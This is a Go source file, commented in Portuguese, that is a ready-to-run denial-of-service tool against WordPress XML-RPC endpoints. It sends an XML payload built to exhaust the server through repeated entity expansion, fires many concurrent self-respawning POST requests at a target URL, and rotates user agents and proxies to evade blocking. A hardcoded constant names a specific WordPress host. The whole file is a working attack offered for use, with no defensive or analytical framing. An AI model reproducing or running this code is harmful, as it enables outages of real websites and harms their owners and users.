package main

import (
	"os"
	"fmt"
	"flag"
	"time"
	"bytes"
	"context"
	"strings"
	"net/url"
	"net/http"
	"math/rand"

)
var (
    targetURL      	string
    numConnections 	int
    proxies        	[]string
    processTimeout  string 
    userAgents 		= []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    }
	// XML genérico de exemplo
	xmlData = []byte(
		`<?xml version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE dummy [<!ENTITY dummy "oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"]>
		<methodCall>
			<methodName>lmao&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;&down;</methodName>
			<params>
				<param><value>oo</value></param>
				<param><value>oo</value></param>
			</params>
		</methodCall>`)
)
const (
	xmlrpcURL = "https://wordpress.atomicsec.com.br/xmlrpc.php" // URL do XML-RPC
	concurrentRequests = 100 // Número de requisições simultâneas
)

func init() {
    // Definir flags para a URL, número de threads e proxies
    flag.StringVar(&targetURL, "url", "", "URL do servidor alvo (obrigatório)")
    flag.IntVar(&numConnections, "workers", 50, "Número de conexões simultâneas")
	proxiesInput := flag.String("proxies", "", "Lista de proxies separados por vírgula (ex: http://proxy1:port,http://proxy2:port)")
    flag.StringVar(&processTimeout, "process-timeout", "2m", "Tempo total do processo (ex: 5m, 1h)")
    flag.Parse()

    // Validar se a URL foi fornecida
    if targetURL == "" {
        fmt.Println("A URL do servidor alvo é obrigatória.")
        flag.Usage()
        os.Exit(1)
    }

    // Separar os proxies pela vírgula se fornecidos
    if *proxiesInput != "" {
        proxies = strings.Split(*proxiesInput, ",")
    }
}

func parseDuration(durationStr string) time.Duration {
    d, err := time.ParseDuration(durationStr)
    if err != nil {
        fmt.Printf("Erro ao parsear duração %s: %v\n", durationStr, err)
        os.Exit(1)
    }
    return d
}


func attack(ctx context.Context, proxyURL string, stopChan <-chan struct{}) {
	select {
		case <-ctx.Done():
			return
		case <-stopChan:
			return
		default:  
			var transport *http.Transport
            proxy, err := url.Parse(proxyURL)
            if err != nil {
                fmt.Println("Erro ao parsear o proxy:", err)
                return
            }

			transport = &http.Transport{
                Proxy: http.ProxyURL(proxy),
            }

			client := &http.Client{
				Transport: transport,
				Timeout: 10 * time.Second,
			}
			req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(xmlData))
			if err != nil {
				fmt.Println("Erro ao criar requisição:", err)
				return
			}

			req.Header.Set("Content-Type", "text/xml")
			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
			req.Header.Set("Connection", "keep-alive")
            req.Header.Set("Cache-Control", "no-cache")

			resp, err := client.Do(req)
			if err != nil {
				fmt.Println("Erro ao enviar requisição:", err)
				return
			}
			defer resp.Body.Close()

			fmt.Println("Status da requisição:", resp.Status)
			go attack(ctx, proxyURL, stopChan)
	
	}
}
func attack_sem_proxy(ctx context.Context, stopChan <-chan struct{}) {
	select {
		case <-ctx.Done():
			return
		case <-stopChan:
			return
		default:  

			client := &http.Client{
				Timeout: 10 * time.Second,
			}
			req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(xmlData))
			if err != nil {
				fmt.Println("Erro ao criar requisição:", err)
				return
			}

			req.Header.Set("Content-Type", "text/xml")
			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
			req.Header.Set("Connection", "keep-alive")
            req.Header.Set("Cache-Control", "no-cache")

			resp, err := client.Do(req)
			if err != nil {
				fmt.Println("Erro ao enviar requisição:", err)
				return
			}
			defer resp.Body.Close()

			fmt.Println("Status da requisição:", resp.Status)
			go attack_sem_proxy(ctx, stopChan)
	
	}
}

func main() {
	processTimeout := parseDuration(processTimeout)

	ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
	defer cancel()
	stopChan := make(chan struct{})
    fmt.Println("Iniciando ataque XML RPC em", targetURL)
    for i := 0; i < numConnections; i++ {
        if len(proxies) > 0 {
            go attack(ctx, proxies[rand.Intn(len(proxies))], stopChan)
        } else {
            go attack_sem_proxy(ctx, stopChan) // Sem proxy
        }
    }
    <-ctx.Done()
    // Envia sinal para parar todas as goroutines
    close(stopChan)
    fmt.Println("Processo finalizado.")
    os.Exit(0)
}
